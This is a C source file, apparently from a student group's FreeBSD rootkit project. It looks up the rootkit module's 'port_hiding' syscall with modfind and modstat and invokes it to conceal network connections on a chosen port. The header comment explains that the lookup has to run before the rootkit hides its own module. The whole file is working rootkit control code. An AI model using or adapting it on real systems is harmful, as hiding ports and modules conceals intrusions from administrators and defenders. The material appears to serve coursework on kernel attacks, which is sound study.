/*
 * Calls the rootkit's port_hiding syscall, so the demo can switch the network
 * concealment on without editing the rootkit.
 *
 * It lives here rather than in rootkit/ for two reasons. rootkit/ has to stay
 * byte-identical to what the rest of the group handed in, and the ordering trap
 * belongs next to the thing that trips over it: the syscall number comes from
 * modfind("sys/port_hiding"), which only works while the module file is still
 * in linker_files. Once rootkit.ko has been hidden, sys/port_hiding is gone
 * too. Call this before hiding, or pass the number in by hand.
 *
 *   cc -O2 -Wall -o port_hide port_hide.c
 *
 *   ./port_hide <port>          look up sys/port_hiding and call it
 *   ./port_hide <port> <nr>     skip the lookup, use syscall <nr>
 *
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>
#include <unistd.h>

static int
find_syscall(const char *module_name)
{
	struct module_stat module_stat;
	int module_id;

	module_id = modfind(module_name);
	if (module_id == -1) {
		perror("modfind");
		return (-1);
	}

	memset(&module_stat, 0, sizeof(module_stat));
	module_stat.version = sizeof(module_stat);
	if (modstat(module_id, &module_stat) == -1) {
		perror("modstat");
		return (-1);
	}

	return (module_stat.data.intval);
}

int
main(int argc, char **argv)
{
	int port, nr;

	if (argc < 2) {
		fprintf(stderr, "usage: %s <port> [syscall-number]\n", argv[0]);
		return (2);
	}
	port = atoi(argv[1]);
	if (port <= 0 || port > 65535) {
		fprintf(stderr, "%s: bad port '%s'\n", argv[0], argv[1]);
		return (2);
	}

	if (argc >= 3)
		nr = atoi(argv[2]);
	else {
		nr = find_syscall("sys/port_hiding");
		if (nr == -1) {
			fprintf(stderr,
			    "sys/port_hiding not visible: the module is already "
			    "hidden, or it is not loaded.\n"
			    "Pass the syscall number explicitly if you recorded "
			    "it before hiding.\n");
			return (1);
		}
	}

	printf("port_hiding syscall %d, port %d\n", nr, port);
	if (syscall(nr, port) == -1) {
		perror("port_hiding");
		return (1);
	}

	return (0);
}
